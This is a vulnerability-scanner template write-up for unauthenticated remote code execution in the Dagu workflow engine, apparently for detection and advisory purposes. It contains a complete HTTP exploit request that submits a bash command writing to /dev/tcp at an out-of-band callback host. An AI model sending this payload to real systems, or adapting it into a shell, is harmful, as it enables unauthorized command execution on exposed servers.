# Nuclei Template: Dagu Workflow Engine - Remote Code Execution
**Template ID:** dagu-rce
**Vulnerability Class:** Missing Authentication for Critical Function
**Severity:** Critical
**CWE:** CWE-306
**Source:** Nuclei Template (`dagu-rce.yaml`)

## Vulnerability Information & PoC

## Description
Dagu (<= 1.30.3) ships with authentication disabled by default. The POST /api/v2/dag-runs endpoint accepts inline YAML DAG specifications and immediately executes shell commands without credentials.

## Steps to reproduce / Exploit Payload
```http
POST /api/v2/dag-runs HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"name":"vt-{{dag_name}}","spec":"steps:\n  - name: oob\n    command: bash -c 'echo vt > /dev/tcp/{{interactsh-url}}/80'\n"}
```

## Remediation
Upgrade to a patched version.

## References
- https://github.com/dagu-org/dagu
- https://vulnerabletarget.com/vt-dagu
- https://github.com/advisories/GHSA-6qr9-g2xw-cw92
